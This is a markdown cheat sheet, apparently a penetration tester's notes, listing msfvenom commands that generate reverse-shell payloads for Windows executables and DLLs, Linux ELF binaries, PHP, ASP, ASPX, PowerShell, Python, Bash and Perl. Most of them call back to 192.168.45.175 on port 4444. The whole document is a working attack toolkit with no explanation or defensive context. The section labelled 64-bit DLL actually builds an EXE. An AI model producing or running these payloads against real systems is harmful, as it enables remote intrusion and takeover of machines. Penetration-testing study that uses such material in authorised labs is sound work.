
### Generating msfvenom payloads

#### EXE
64bit
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe  
```
32bit
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f exe -o shell-x86.exe
```
#### DLL
64bit
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f exe -o shell.exe  
```
32bit 
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f dll -o shell-x86.dll
```


### ELF
32-BIT
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f elf -o shell-x86.elf
```
64 BIT
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f elf -o shell-x64.elf
```


### PHP
```
msfvenom -p php/reverse_php LHOST=192.168.45.175 LPORT=4444 -f raw -o shell.php
```

### ASP Classic (IIS/Windows)

```
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f asp -o shell.asp
```
#### ASPX (.NET/Windows)

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f aspx -o shell.aspx
```

#### PowerShell Script (.ps1)

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f ps1 -o shell.ps1
```
#### PowerShell One-liner Command

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.175 LPORT=4444 -f psh -o shell-cmd.txt
```

#### Python Reverse Shell

```
msfvenom -p cmd/unix/reverse_python LHOST=192.168.45.175 LPORT=4444 -f raw -o shell.py
```
#### Bash Reverse Shell

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.175 LPORT=4444 -f raw -o shell.sh
```
#### Perl Reverse Shell

```
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.45.175 LPORT=4444 -f raw -o shell.pl
```
